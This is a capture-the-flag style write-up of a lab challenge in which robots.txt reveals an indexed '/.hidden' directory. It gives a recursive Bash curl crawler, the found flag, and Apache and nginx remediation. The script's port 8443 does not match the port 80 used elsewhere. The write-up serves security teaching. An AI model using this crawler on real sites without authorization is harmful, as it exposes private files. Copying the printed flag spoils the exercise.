# Hidden Directory Enumeration via robots.txt

## Summary

This breach exploits the common misuse of `robots.txt` as a security measure. The file explicitly listed a hidden directory that the site owner did not want indexed — but `robots.txt` is public and readable by anyone. The hidden path contained a deeply nested auto-indexed directory tree with ~17,000 files. A recursive crawl script was used to traverse every subfolder and locate a `README` file containing the flag.

---

## Category

**Information Disclosure / Security Misconfiguration**
OWASP: [A05:2021 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

---

## Steps to Reproduce

### 1. Read robots.txt

Navigate to the standard robot exclusion file:

```
http://10.11.10.2:80/robots.txt
```

The file reveals:

```
User-agent: *
Disallow: /.hidden
```

The intent was to prevent search engine crawlers from indexing this path. In practice, it is a **public signpost** pointing directly at sensitive content.

### 2. Visit the hidden directory

Navigate to:

```
http://10.11.10.2:80/.hidden/
```

The server responds with an auto-generated directory listing (directory indexing is enabled). Inside are dozens of randomly named subdirectories, each containing further subdirectories — a tree several levels deep with approximately **17,000 files** total, each a `README` file containing either a troll message or the flag.

### 3. Write a recursive crawl script

Manually clicking through ~17,000 directories is not feasible. The solution is a script that:

1. Fetches a directory listing page
2. Parses all links
3. Recursively follows subdirectory links
4. Prints the content of any `README` file found

**Bash

```bash
#!/bin/bash

BASE_URL="http://10.11.10.2:8443/.hidden"
OUTPUT_FILE="readme_contents.txt"
 
> "$OUTPUT_FILE"
 
crawl() {
    local url="$1"
 
    # Fetch the index page with timeouts
    local page
    page=$(curl -s --connect-timeout 3 --max-time 5 "$url/")
    [ -z "$page" ] && return
 
    local subdirs
    subdirs=$(echo "$page" | grep -oP '(?<=href=")[a-z]+(?=/")' )
 
    # Check for a README in this directory
    local readme
    readme=$(curl -s --connect-timeout 3 --max-time 5 --fail "$url/README")
    if [ $? -eq 0 ] && [ -n "$readme" ]; then
        echo "=== $url/README ===" >> "$OUTPUT_FILE"
        echo "$readme" >> "$OUTPUT_FILE"
        echo "" >> "$OUTPUT_FILE"
        echo "[+] Found README at $url" >&2
    fi
 
    # Recurse into subdirectories
    for dir in $subdirs; do
        crawl "$url/$dir"
    done
}
 
echo "Starting crawl of $BASE_URL ..."
crawl "$BASE_URL"
echo "Done! Results saved to $OUTPUT_FILE"
```

### 4. Flag

Running the script surfaces the one legitimate `README`:

```
=== http://10.11.10.2:80/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README ===
Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

---

## Why This Works

Two independent misconfigurations compound each other:

| Misconfiguration | Consequence |
|---|---|
| Sensitive path listed in `robots.txt` | The path is publicly advertised to anyone who reads the file |
| Directory indexing enabled on `/.hidden` | No authentication, no access control — the full file tree is browsable by anyone |

`robots.txt` is a **convention**, not a security control. It instructs compliant web crawlers to skip certain paths. It does not prevent human visitors, custom scripts, or malicious bots from accessing those paths. Listing a sensitive path there is the opposite of hiding it.

---

## Root Cause

- **Directory indexing left enabled** — the web server should never serve auto-generated file listings in production, especially for directories containing internal files.
- **Conflating obscurity with security** — the developer assumed that because a path was unlisted from search engines it was inaccessible. Obscurity is not a security boundary.
- **No access control on `/.hidden`** — there is no authentication gate, IP restriction, or `.htaccess` protection on the directory.

---

## Remediation

### 1. Disable directory indexing

In Apache, ensure `Options -Indexes` is set globally or per-directory:

```apache
<Directory /var/www/html>
    Options -Indexes
</Directory>
```

In nginx, ensure `autoindex` is off (it is off by default):

```nginx
autoindex off;
```

### 2. Never use robots.txt to obscure sensitive paths

`robots.txt` should only reference paths that are already publicly accessible but irrelevant to search engines (e.g. `/sitemap.xml`, `/search?q=`). Sensitive paths must be protected by authentication — if they need to be inaccessible, listing them in `robots.txt` actively advertises their existence.

### 3. Apply access controls to sensitive directories

Use HTTP Basic Auth, session-based authentication, or network-level restrictions for any directory that should not be publicly accessible:

```apache
<Directory /var/www/html/.hidden>
    AuthType Basic
    AuthName "Restricted"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
</Directory>
```

---

## References

- [OWASP: Test for Directory Browsing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information)
- [CWE-548: Exposure of Information Through Directory Listing](https://cwe.mitre.org/data/definitions/548.html)
- [CWE-538: File and Directory Information Exposure](https://cwe.mitre.org/data/definitions/538.html)
- [robots.txt specification – robotstxt.org](https://www.robotstxt.org/robotstxt.html)
